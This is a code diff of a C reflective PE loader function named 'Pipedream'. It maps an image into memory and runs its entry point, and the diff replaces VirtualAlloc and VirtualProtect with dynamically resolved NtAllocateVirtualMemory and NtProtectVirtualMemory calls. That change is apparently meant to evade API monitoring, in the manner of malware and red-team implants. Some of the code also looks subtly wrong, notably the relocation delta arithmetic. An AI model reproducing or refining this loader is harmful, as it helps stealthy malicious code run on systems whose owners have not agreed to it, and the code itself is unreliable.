@@ -1,5 +1,6 @@
-#include "../include/PeUtils.h"
+#include "../include/Loader.h"
 #include "../include/Macros.h"
+#include "../include/Peb.h"
 
 typedef BOOLEAN ( WINAPI* DLLMAIN_T ) (
 	HMODULE ImageBase,
@@ -9,6 +10,7 @@ typedef BOOLEAN ( WINAPI* DLLMAIN_T ) (
 
 void Pipedream(void) {
 	// Loader Vars
+  NTSTATUS status;
 	DLLMAIN_T Ent;
 	LPVOID pe_base;
 	RELOC_CTX rcRelocCtx;
@@ -21,23 +23,26 @@ void Pipedream(void) {
 	SIZE_T szSizeImage;
 	DWORD_PTR pdwDelta;
 	
-
 	// Calc memory for image
 	szSizeImage = (((NtH->OptionalHeader.SizeOfImage) + 0x1000 - 1) & ~(0x1000 - 1));
+	
+	fn_NtAllocateVirtualMemory pdNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)pdGetProcAddress(pdGetModuleHandle(NTDLL, NULL, NULL), NT_VIRTUAL_ALLOC, 0);
 
 	// Alloc memory for image
-	pe_base = VirtualAlloc(
-		(LPVOID)NtH->OptionalHeader.ImageBase,
-		szSizeImage,
+	status = pdNtAllocateVirtualMemory(
+		(HANDLE)((HANDLE)-1),
+		&pe_base,
+		0,
+		&szSizeImage,
 		MEM_RESERVE | MEM_COMMIT,
 		PAGE_READWRITE
 	);
-	if (pe_base == NULL) {
+	if (status != STATUS_SUCCESS || pe_base == NULL) {
 		return;
 	}
 
 	// Copy sections
-	pdCopySections(IMAGE_FIRST_SECTION(NtH), NtH->FileHeader.NumberOfSections, 0, pe_base, C_PTR( G_END(  ) ));
+	pdCopySections(IMAGE_FIRST_SECTION(NtH), NtH->FileHeader.NumberOfSections, 0, pe_base, C_PTR(NULL)); // HERE BASE OF FILE
 
 	// Perform relocations
 	pdwDelta = (DWORD_PTR)pe_base + (DWORD_PTR)NtH->OptionalHeader.ImageBase;
@@ -54,7 +59,18 @@ void Pipedream(void) {
 	pdLoadImports(import_desc, pe_base);
 
 	// Change permissions to R_X
-	VirtualProtect(pe_base, szSizeImage, PAGE_EXECUTE_READ, &dwOldProtect);
+	fn_NtProtectVirtualMemory pdNtProtectVirtualMemory = (fn_NtProtectVirtualMemory)pdGetProcAddress(pdGetModuleHandle(NTDLL, NULL, NULL), NT_VIRTUAL_PROTECT, 0);
+	status = pdNtProtectVirtualMemory(
+		(HANDLE)((HANDLE)-1),
+		&pe_base,
+		&szSizeImage,
+		PAGE_EXECUTE_READ,
+		&dwOldProtect
+	);
+	if (status != STATUS_SUCCESS) {
+		return;
+	}
+
 
 	// Execute
 	Ent = C_PTR( U_PTR( pe_base ) + NtH->OptionalHeader.AddressOfEntryPoint );
@@ -62,4 +78,5 @@ void Pipedream(void) {
 	Ent( G_SYM( Start ), 4, NULL );
 
 	return;
+
 }
